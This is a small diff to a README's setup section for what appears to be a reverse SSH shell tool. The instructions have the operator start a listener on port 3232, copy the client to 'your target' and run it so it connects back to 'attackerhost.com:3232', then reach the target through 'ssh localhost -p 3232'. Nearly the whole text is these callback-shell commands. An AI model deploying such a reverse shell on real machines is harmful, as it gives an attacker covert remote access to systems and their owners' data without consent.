@@ -36,10 +36,13 @@ make
 cd bin/
 
 cp ~/.ssh/id_ed25519.pub authorized_keys
+./server 0.0.0.0:3232
 
 #copy client to your target 
-./server 0.0.0.0:3232
-./client --foreground attackerhost.com:3232 
+./client attackerhost.com:3232
+
+#connect to the server from your attacker host
+ssh localhost -p 3232
 ```
 
 ## Setup Instructions
